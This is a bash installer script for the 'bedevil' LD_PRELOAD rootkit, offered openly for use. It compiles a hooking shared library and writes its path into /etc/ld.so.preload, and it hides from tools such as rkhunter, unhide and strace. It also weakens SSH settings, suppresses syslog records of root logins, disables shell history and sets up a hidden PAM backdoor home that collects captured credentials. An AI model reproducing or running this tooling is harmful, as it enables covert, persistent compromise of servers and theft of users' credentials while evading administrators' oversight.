#!/bin/bash

tty -s && clear
[ -f .ascii ] && printf "\e[1m\e[31m`cat .ascii`\e[0m\n"

verb() { [ $VERBOSE = 1 ] && printf "\e[6m$1\e[0m\n"; }
wecho() { printf " \e[33m[!]\e[0m $1\n"; }
eecho() { printf " \e[31m[!]\e[0m $1\n"; }
secho() { printf " \e[32m[+]\e[0m $1\n"; }
necho() { printf " [..] $1\n"; }

[ $(id -u) != 0 ] && { eecho "You do not have root privileges. Your actions are limited."; NOT_ROOT=1; }
[ -e /proc ] || { eecho "/proc doesn't exist. May I suggest bailing?"; exit; }
[ `which gcc` ] || { eecho "GCC not found"; exit; }
[ -f /etc/ssh/sshd_config ] || { eecho "/etc/ssh/sshd_config not present."; exit; }
[[ $(cat /etc/syslinux/config 2>&1 | grep "SELINUX=" | tail -n 1) == *"enforcing"* ]] && eecho "SELinux detected (enforcing)"
[ -d /proc/xen ] && wecho "Xen environment detected"
[ -d /proc/vz ] && wecho "OpenVZ environment detected"
[ -f /usr/bin/lveps ] && wecho "CloudLinux LVE detected"
[[ $(cat /proc/scsi/scsi 2>&1 | grep 'VBOX') == *"VBOX"* ]] && wecho "VirtualBox VM detected"

[ -z $MGID ] && MGID=$RANDOM
[ -z $IDIR ] && IDIR="/lib/bedevil.$RANDOM"
[ -z $BD_ENV ] && BD_ENV="`cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 8 | head -n 1`"
[ -z $LDSO_PRELOAD ] && LDSO_PRELOAD="/etc/ld.so.preload"
[ -z $SSH_LOGS ] && SSH_LOGS="/lib/bedevil.$RANDOM"
[ -z $BDVLSO ] && BDVLSO="`cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 12 | head -n1`.so"
[ -z $MDIR ] && MDIR="symbols"
[ -z $NEW_MDIR ] && NEW_MDIR="${RANDOM}_$MDIR"
[ -z $LIBHOOKS ] && LIBHOOKS="$NEW_MDIR/lib_hooks"
[ -z $PLATFORM ] && PLATFORM="`uname -m`"

declare -a array HPROCS=("lsrootkit" "ldd" "unhide" "rkhunter" "chkproc" "chkdirs" "ltrace" "strace" "LD_AUDIT") # hide from these
declare -a array CFILES=(".ascii" "etc/ssh.sh" "etc/eutils.sh" "etc/README") # local static files to copy over to the install dir

# dependencies
declare -a array YUM_DEPS=("gcc" "pam-devel" "newt" "libgcc.i686" "glibc-devel.i686" "glibc-devel" "libpcap" "libpcap-devel" "vim-common")
declare -a array APT_DEPS=("libpam-dev" "libpcap-dev" "gcc-multilib" "build-essential")
declare -a array PAC_DEPS=("pam" "libpcap" "base-devel")

# populated later on...
declare -a array HOOKS=()
declare -a array INT_VARS=()
declare -a array STR_VARS=()

HELPMSG="
  Usage: $0 [ -h | -v | -d | -b | -c | -C | -D | -i]
        -h: Show this help message and exit.
        -v: Toggle verbose output.
        -d: Populate rootkit headers with user data.
        -b: Make bdvl.c.
        -c: Compile rootkit library in current directory and exit.
        -C: Clean up installation/compilation mess and exit.
        -D: Install all potential required dependencies.
        -i: Launch full installation of bedevil. You will be
            prompted for input when needed.
"

asc() { printf '%d' "'$1"; }
xenc()
{
    local din ptr dout val1
    din=$1
    for (( ptr=0;ptr<${#din};ptr++ )); do
        val1=$(asc "${din:$ptr:1}")
        dout+=$(printf '\\\\x%02x' "$((val1 ^ 0xac))")
    done
    echo -n "$dout"
}

guserpwd()
{
    [ ! -z "`which python3`" ] && { echo -n `python3 -c "import crypt;print(crypt.crypt(\"$1\"))"`; return; }
    echo -n $(openssl passwd -6 -salt `cat /dev/urandom | tr -dc 'A-Za-z0-9' | fold -w 16 | head -n1` $1)
}

patch_libdl()
{
    necho "Patching dynamic linker libraries."
    LDSO_PRELOAD="$(etc/plibdl.sh $LDSO_PRELOAD)"
    secho "New ld.so.preload location: $LDSO_PRELOAD"
}


install_deps()
{
    necho "Installing dependencies."
    if [ -f /usr/bin/yum ]; then
        yum install -y -q -e 0 "${YUM_DEPS[*]}" &>/dev/null
    elif [ -f /usr/bin/apt-get ]; then
        dpkg --add-architecture i386 &>/dev/null
        yes | apt-get update &>/dev/null
        apt-get --yes --force-yes install "${APT_DEPS[*]}" &>/dev/null
        [ ! -z "$(apt-cache search libpcap0.8-dev)" ] && apt-get --yes --force-yes install libpcap0.8-dev &>/dev/null
        grep -i ubuntu /proc/version &>/dev/null && rm -f /etc/init/plymouth* &>/dev/null
    elif [ -f /usr/bin/pacman ]; then
        pacman -Syy &>/dev/null
        pacman -S --noconfirm "${PAC_DEPS[*]}" &>/dev/null
    fi
}

# $1=name of char array, $2=list, $3=size of array
build_char_array()
{
    local nam arr carr asize
    nam=$1; arr=$2
    asize="#define `echo -n ${nam} | awk '{print toupper($0)}'`_SIZE $3"
    carr="\n${asize}\nstatic char *${nam}[`echo -n ${asize} | awk '{print $2}'`] = {"
    for e in ${arr[@]}; do carr+="\"`xenc $e`\","; done
    carr="${carr::-1}};\n"
    echo -n $carr
}

write_char_arrays()
{
    necho "Building & writing C char arrays for the lib headers"

    local lhc clibchar clibname chooks i
    lhc=("$(cat $LIBHOOKS)")
    for lhookd in $lhc; do
        IFS=':' read -a lhookc <<< "$lhookd"
        clibname="${lhookc[0]}" # name of lib
        chooks="${lhookc[1]}" # list of lib symbols

        IFS=',' read -a lhooks <<< "$chooks" # sort symbols into a list
        # build char arrays for each library which symbols we're hooking
        clibchar+="`build_char_array $clibname "${lhooks[*]}" ${#lhooks[*]}`"
        # add library symbol names to list so we can build a char array with them all
        for chook in ${lhooks[@]}; do HOOKS+=("$chook"); done
    done

    clibchar+="`build_char_array "all" "${HOOKS[*]}" ${#HOOKS[*]}`"
    clibchar+="`build_char_array "hprocs" "${HPROCS[*]}" ${#HPROCS[*]}`"

    i=0
    for chook in ${HOOKS[@]}; do
        clibchar+="#define C`echo $chook | awk '{print toupper($0)}'` $i\n"
        let "i=$i+1"
    done

    printf "\n$clibchar\n" >> $NEW_MDIR/headers/rk_creds.h
}

# parses 'modules/stconsts' for misc consts that are required by the rk lib but
# that the user not need have influence over.
write_sconsts()
{
    local stconsts cconsts cname cval
    stconsts="`cat $NEW_MDIR/stconsts | grep -o '^[^#]*'`"

    necho "Writing background variables"
    while read -r line; do # go line by line
        IFS=':' read -a pline <<< "$line" # seperate name and value on line
        cname=${pline[0]} # const name
        cval=${pline[1]} # const value
        [ $cval == $cname ] && cconsts+="#define $cname \"`xenc ${!cval}`\"\n" # reference variable in this script by the const value
        [ $cval != $cname ] && cconsts+="#define $cname \"`xenc $cval`\"\n" # we already have a suitable value, use that
    done <<< "$stconsts"

    printf "\n$cconsts\n#endif" >> $NEW_MDIR/headers/rk_creds.h
}

start_config_wizard()
{
    # first we need to find what placeholders are available in our module directory.
    find_placeholders

    echo
    secho "Beginning the main user config wizard"
    necho "You may want to change a couple of the default input settings,"
    necho "but you can leave a majority of the settings as their defaults."
    echo

    local RAND_VALUE
    for var in ${STR_VARS[*]}; do
        RAND_VALUE="`cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 8 | head -n1`"
        [[ "$var" == *"IDIR"* ]] && RAND_VALUE=$IDIR
        [[ "$var" == *"BD_ENV"* ]] && RAND_VALUE=$BD_ENV
        [[ "$var" == *"SSH_LOGS"* ]] && RAND_VALUE=$SSH_LOGS

        read -p " [..] Variable input for ${var//\?} [$RAND_VALUE]: "
        if [ ! -z $REPLY ]; then
            [[ "$var" == *"BD_PWD"* ]] && { PSETTINGS+="\"`xenc $(guserpwd $REPLY)`\":$var "; continue; }
            PSETTINGS+="\"`xenc $REPLY`\":$var "
            [[ "$var" == *"IDIR"* ]] && eval IDIR="$REPLY"
            [[ "$var" == *"BD_ENV"* ]] && eval BD_ENV="$REPLY"
            [[ "$var" == *"SSH_LOGS"* ]] && eval SSH_LOGS="$REPLY"
            continue
        fi
        [[ "$var" == *"BD_PWD"* ]] && { PSETTINGS+="\"`xenc $(guserpwd $RAND_VALUE)`\":$var "; continue; }
        PSETTINGS+="\"`xenc $RAND_VALUE`\":$var "
    done

    for var in ${INT_VARS[*]}; do
        RAND_VALUE=`cat /dev/urandom | tr -dc '1-9' | fold -w 4 | head -n1`
        [[ "$var" == *"MGID"* ]] && { let "MGID %= 9999"; RAND_VALUE=$MGID; }
        
        read -p " [..] Variable input for ${var//\?} [$RAND_VALUE]: "
        if [ ! -z $REPLY ]; then
            PSETTINGS+="$REPLY:$var "
            [[ "$var" == *"MGID"* ]] && eval MGID=$REPLY
            continue
        fi
        PSETTINGS+="$RAND_VALUE:$var "
    done

    SOPATH="$IDIR/$BDVLSO.$PLATFORM"
    secho "End of config wizard.\n"
    verb $PSETTINGS
}

find_placeholders()
{
	necho "Finding variable placeholders"
    local HDC CVAR
    HDC=("$(cat $MDIR/headers/rk_creds.h)")
    for w in $HDC; do
        CVAR=`echo $w | grep "??"`
        [ -z $CVAR ] && continue
        [[ $CVAR == *"\""* ]] && { STR_VARS+=($CVAR); continue; }
        INT_VARS+=($CVAR)
    done
}

# $1 = file location of current header.
overwrite_placeholders()
{
    necho "Overwriting variable placeholders with new settings"
    IFS=' ' read -a PSETTING <<< "$PSETTINGS" # parse current placeholder setting
    for ps in ${PSETTING[@]}; do
        IFS=':' read -a cps <<< "$ps"
        local cx=$(printf ''${cps[0]}'' )
        verb "cps[0]=${cps[0]}" # new value
        verb "cps[1]=${cps[1]}" # old placeholder
        sed -i "s/${cps[1]}/${cx//x/'\\'\x}/g" $1 # i don't know if this is proper but it works
    done
}

populate_new_placeholders()
{
    # copy module directory to new directory
    cp -r $MDIR/ $NEW_MDIR/ || { eecho "Couldn't copy module directory."; exit; }

    write_char_arrays
    start_config_wizard
    write_sconsts
    overwrite_placeholders $NEW_MDIR/headers/rk_creds.h
}

build_bdvlc()
{
    local all_includes
    while read -r line; do all_includes+="#include $line\n"; done <<< "`cat "$MDIR/std_includes" | grep -o '^[^#]*' && cat "$MDIR/symbol_includes" | grep -o '^[^#]*'`"

    local _BDVLC="#define _GNU_SOURCE
$all_includes
`cat "$MDIR/prehook.c"`"
    printf "$_BDVLC" > bdvl.c
}

compile_bdvl()
{
    [ ! -d "$NEW_MDIR" ] && { eecho "'$NEW_MDIR' does not exist. Have you populated your new headers?"; exit; }
    
    local WARNING_FLAGS OPTIMIZATION_FLAGS OPTIONS LINKER_OPTIONS LINKER_FLAGS

    WARNING_FLAGS="-Wall -Wno-comment -Wno-nonnull-compare"
    OPTIMIZATION_FLAGS="-O0 -g0"
    OPTIONS="-fomit-frame-pointer -fPIC"
    LINKER_OPTIONS="-Wl,--build-id=none"
    LINKER_FLAGS="-ldl -lcrypt"

    rm -f *.so.*
    gcc -std=gnu99 $OPTIMIZATION_FLAGS bdvl.c $WARNING_FLAGS $OPTIONS -I$NEW_MDIR -shared $LINKER_FLAGS $LINKER_OPTIONS -o $BDVLSO.$PLATFORM
    gcc -m32 -std=gnu99 $OPTIMIZATION_FLAGS bdvl.c $WARNING_FLAGS $OPTIONS -I$NEW_MDIR -shared $LINKER_FLAGS $LINKER_OPTIONS -o $BDVLSO.i686 &>/dev/null
    strip -s $BDVLSO.$PLATFORM || { eecho "Couldn't strip library. Exiting."; exit; }
    strip -s $BDVLSO.i686 &>/dev/null

    secho "Shared library compiled. ($BDVLSO.$PLATFORM $(ls -lhN $BDVLSO.$PLATFORM | awk '{print $5}'))" && rm -f bdvl.c
}

cleanup_bdvl()
{
    secho "Cleaning up local mess."
    rm -rf $NEW_MDIR bdvl.c *.so.*
}

# $1 = installation directory (home)
setup_home()
{
    local LBASHRC RBASHRC

    LBASHRC="$1/.bashrc"
    RBASHRC="tty -s || return
[ ! -z \$TERM ] && export TERM=xterm
unset HISTFILE SAVEHIST TMOUT PROMPT_COMMAND
[ \$(id -u) != 0 ] && su root
[ \$(id -u) != 0 ] && kill -9 \$\$
[ -f ~/etc/README ] && cat ~/etc/README | less && rm ~/etc/README

clear
[ -f ~/.ascii ] && printf \"\\e[1m\\e[31m\`cat ~/.ascii\`\\e[0m\\n\"

export PATH=\"\$PATH:~/etc\"
alias ls='ls --color=auto'
alias ll='ls --color=auto -AlFhn'

id; who
[ ! -f ~/auth_logs ] && touch ~/auth_logs
echo -e \"\\033[1mLogged accounts: \\033[1;31m\$(grep Username ~/auth_logs 2>/dev/null | wc -l)\\033[0m\"
echo -e \"\\033[1mSSH logs: \\033[1;31m\$(cat ~/ssh_logs | wc -l)\\033[0m\""
    echo '. .bashrc' > "$1/.profile"
    echo "$RBASHRC" > $LBASHRC

    mkdir $1/etc
    for f in ${CFILES[*]}; do cp $f $1/$f; done # copy array of 'important' static files

    necho "Hiding rootkit files"
    touch $SSH_LOGS && chmod 777 $SSH_LOGS && ln -s $SSH_LOGS $1/ssh_logs
    chown 0:$MGID $LDSO_PRELOAD $SSH_LOGS $1 $1/* $1/.profile $1/.bashrc $1/.ascii

    necho "Attempting to fix systemd"
    if [ -d /etc/rsyslog.d ]; then
        echo 'if ($programname == "systemd" or $programname == "systemd-logind") and (($msg contains "New session" and $msg contains "of user root") or ($msg contains "session opened for user root by (uid=0)") or ($msg contains "Removed session") or ($msg contains "session closed for user root")) then stop'>/etc/rsyslog.d/bdvl_sysd.conf
        systemctl restart rsyslog
        secho "New systemd rules written."
    fi
}

install_bdvl()
{
    [ ! -z $NOT_ROOT ] && { eecho "You cannot install bedevil without root privs. Exiting."; exit; }

    secho "Starting full installation!\n"

    wecho "Do you want to patch the dynamic linker?"
    necho "This essentially provides libdl a new ld.so.preload file location."
    wecho "If you are doing this, you need to do this now."
    
    read -p "`wecho "Patch libdl? [Y/n]: "`" -n 1 -r
    if [[ $REPLY =~ ^[Yy]$ ]]; then patch_libdl;
    else echo; necho "Not patching libdl."; fi

    read -p "`wecho "Install potential dependencies? [Y/n]: "`" -n 1 -r
    [[ $REPLY =~ ^[Yy]$ ]] && install_deps
    echo

    populate_new_placeholders

    necho "Compiling the rootkit shared library."
    build_bdvlc # builds bdvl.c so we can compile the SO
    compile_bdvl # after this, bdvl.so.* will now exist in the cwd

    export ${BD_ENV}=1
    
    # now we have to install the library and make sure it is present in ld.so.preload
    necho "Installing $BDVLSO to $SOPATH"
    rm -rf $IDIR/
    mkdir -p $IDIR/
    cp $BDVLSO.$PLATFORM $SOPATH
    cp $BDVLSO.i686 $IDIR/$BDVLSO.i686 2>/dev/null

    necho "Pointing $LDSO_PRELOAD to $SOPATH"
    [ -f "$LDSO_PRELOAD" ] && chattr -ia $LDSO_PRELOAD &>/dev/null

    [ "$(cat /etc/ssh/sshd_config | grep 'UsePAM')" == "UsePAM yes" ] || echo "UsePAM yes" >> /etc/ssh/sshd_config
    [ "$(cat /etc/ssh/sshd_config | grep 'PasswordAuthentication yes')" == "PasswordAuthentication yes" ] || sed -i -e 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config
    
    echo -n $SOPATH > $LDSO_PRELOAD
    secho "Installation successful."
    cleanup_bdvl
    echo

    setup_home $IDIR
    secho "Your PAM backdoor is set up."
    secho "See 'etc/ssh.sh' on connecting with your hidden port."
}

OPTIND=1
VERBOSE=0

while getopts "h?vdpcCbiD" opt; do
    case "$opt" in
    h)
        echo "$HELPMSG" && exit
        ;;
    v)
		secho "Running in verbose mode."
        VERBOSE=1
        ;;
    d)  
        populate_new_placeholders
        ;;
    p)  
        start_config_wizard
        echo $PSETTINGS > example_config
        exit
        ;;
    c)
        compile_bdvl
        ;;
    C)
        cleanup_bdvl
        exit
        ;;
    b)
        build_bdvlc
        ;;
    i)
        install_bdvl
        exit
        ;;
    D)
        install_deps
        exit
        ;;
    ?)
        echo "$HELPMSG" && exit
        ;;
    esac
done

[ -z $1 ] && echo "$HELPMSG"
